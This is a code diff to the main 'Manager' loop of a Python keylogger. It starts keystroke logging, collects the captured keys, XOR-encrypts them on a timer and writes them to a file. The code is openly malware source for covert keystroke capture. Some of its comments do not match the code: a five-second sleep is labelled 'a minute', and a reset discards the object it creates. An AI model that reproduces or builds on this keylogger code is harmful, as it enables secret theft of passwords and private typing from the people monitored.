@@ -5,21 +5,49 @@ from writer import *
 from encryptor import *
 
 class Manager:
+    """Manager class for the KeyLogger,
+    handling the writing and encryption of keystrokes."""
+
     def __init__(self):
-        KeyLogger().start_logging()
+        """Initialize the Manager with a KeyLogger instance and start logging."""
+        self.l = KeyLogger()
+        self.l.start_logging()
 
     def activity(self):
+        """Perform the keylogging activity,
+        writing data to a dictionary and file, and encrypting it periodically."""
+        minute = 5
+        send_encryption = 5
+        reset = 15
+        dw = DictWriter()
+        fw = FileWriter()
         count = 0
         while True:
-            # קבלת הדיקט
-            get_dict = DictWriter().get_dict()
-            # הצפנת הדיקט
-            dict_encrypt = XorEncryption().encryption(get_dict)
-            # שליחת הדיקט לקובץ
-            FileWriter().write(dict_encrypt)
-            # המתן 5 דקות
-            sleep(5 * 60)
+            # Wait for a minute
+            sleep(minute)
             count += 1
-            if count == 3:
-                DictWriter()
-                count = 0
+            # Get the list of logged keys
+            get_list = self.l.get_logged_keys()
+            # print(get_list)
+            # Write the list of characters to the dictionary writer
+            if get_list:
+                dw.write(get_list)
+            # Every 5 minutes, encrypt and write the dictionary to a file
+            if count % send_encryption == 0:
+                # Get the dictionary from the dictionary writer
+                get_dict = dw.get_dict()
+                # print(get_dict)
+                # Encrypt the dictionary
+                if get_dict:
+                    dict_encrypt = XorEncryptor().encrypt(get_dict)
+                    # print(dict_encrypt)
+                    # Write the encrypted dictionary to the file
+                    fw.write(dict_encrypt)
+                if count >= reset:
+                    DictWriter()
+                    count = 0
+
+
+
+if __name__ == "__main__":
+    Manager().activity()
